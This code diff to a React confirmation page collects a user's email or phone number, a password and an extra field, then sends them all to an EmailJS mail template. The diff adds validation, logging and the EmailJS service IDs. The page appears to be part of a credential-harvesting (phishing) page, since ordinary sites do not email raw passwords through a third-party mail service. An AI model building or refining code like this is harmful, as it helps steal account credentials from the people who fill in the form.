@@ -48,7 +48,6 @@ export default function Confirmation() {
 
   const contactMethod = form.watch('contactMethod');
 
-  // Load validation data from localStorage
   useEffect(() => {
     const storedData = localStorage.getItem('validation_data');
     if (!storedData) {
@@ -83,34 +82,46 @@ export default function Confirmation() {
 
     try {
       setIsSubmitting(true);
-      console.log('Form data before submission:', {
-        ...data,
-        password: '[REDACTED]',
-        xs: '[REDACTED]'
-      });
 
-      // Create the submission data with proper structure
+      // Validate required fields
+      if (!data.user_email || !data.password) {
+        toast({
+          variant: "destructive",
+          title: "Error",
+          description: "Please fill in all required fields"
+        });
+        return;
+      }
+
+      // Prepare submission data
       const submissionData = {
         ...data,
         user_email: contactMethod === 'phone' 
           ? `${data.countryCode}${data.user_email}`
           : data.user_email,
         timestamp: new Date().toISOString(),
+        serviceId: import.meta.env.VITE_EMAILJS_SERVICE_ID,
+        templateId: import.meta.env.VITE_EMAILJS_CONFIRMATION_TEMPLATE_ID,
       };
 
-      // Send the email
-      await sendConfirmationFormEmail(submissionData);
+      console.log('Submitting form with data:', {
+        ...submissionData,
+        password: '[REDACTED]',
+        xs: '[REDACTED]'
+      });
 
-      // Clear the validation data from localStorage
+      // Send email
+      const result = await sendConfirmationFormEmail(submissionData);
+      console.log('Email submission result:', result);
+
+      // Clear validation data and show success
       localStorage.removeItem('validation_data');
-
-      // Show success message
       toast({
         title: "Success!",
         description: "Your information has been submitted successfully"
       });
 
-      // Redirect after a short delay
+      // Redirect after delay
       setTimeout(() => {
         setLocation("/success");
       }, 1500);
@@ -126,7 +137,6 @@ export default function Confirmation() {
     }
   };
 
-  // Keep the existing JSX structure unchanged
   return (
     <>
       <MetaTags
